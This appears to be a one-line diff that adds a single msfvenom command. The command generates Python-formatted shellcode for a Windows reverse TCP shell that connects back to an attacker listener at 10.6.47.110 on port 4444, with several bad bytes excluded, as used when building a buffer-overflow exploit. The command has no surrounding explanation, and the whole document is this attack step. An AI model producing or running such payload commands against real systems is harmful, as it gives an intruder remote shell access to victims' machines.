@@ -1,0 +1,1 @@
+msfvenom -p windows/shell_reverse_tcp LHOST=10.6.47.110 LPORT=4444 EXITFUNC=thread -b x00x07x2exa0 -f py
